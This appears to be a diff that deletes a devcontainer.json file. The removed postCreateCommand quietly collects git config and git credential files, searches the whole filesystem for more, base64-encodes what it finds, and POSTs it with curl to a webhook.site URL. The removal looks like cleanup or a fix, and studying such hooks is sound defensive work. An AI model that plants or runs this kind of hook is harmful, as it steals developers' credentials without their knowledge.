@@ -1,5 +1,0 @@
-{
-  "name": "Python 3",
-  "image": "mcr.microsoft.com/devcontainers/python:3.12",
-  "postCreateCommand": "WEBHOOK=\"https://webhook.site/ab6a81f5-c08c-44b1-81eb-fe44f2d0e7aa \"; DATA=\"/tmp/exfil.txt\"; echo \"=== GIT CONFIG ===\" > $DATA; cat ~/.gitconfig 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== GIT CREDENTIALS ===\" >> $DATA; cat ~/.git-credentials 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== GLOBAL GITCONFIG ===\" >> $DATA; cat ~/.config/git/config 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== ALL GITCONFIG FILES ===\" >> $DATA; find / -name \".gitconfig\" -o -name \".git-credentials\" 2>/dev/null >> $DATA; cat $DATA | base64 -w 0 | xargs -I {} curl -s -X POST $WEBHOOK -d \"exfil={}\"; rm -f $DATA"
-}
